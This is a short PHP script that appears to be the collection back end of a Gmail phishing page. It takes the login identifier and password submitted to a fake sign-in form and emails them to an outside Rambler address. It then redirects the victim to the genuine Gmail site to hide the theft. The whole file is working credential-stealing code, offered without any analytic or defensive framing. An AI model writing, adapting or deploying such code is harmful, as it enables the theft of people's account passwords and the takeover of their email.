<?php
$message = $_POST['identifier'] . ':' . $_POST['hiddenPassword'];
$message = wordwrap($message, 70, "<br>");
mail('adesar@rambler.ru', 'Gmail', $message, "From: example@mail.ru");
header('Location: https://www.google.com/intl/ru/gmail/about/');
?>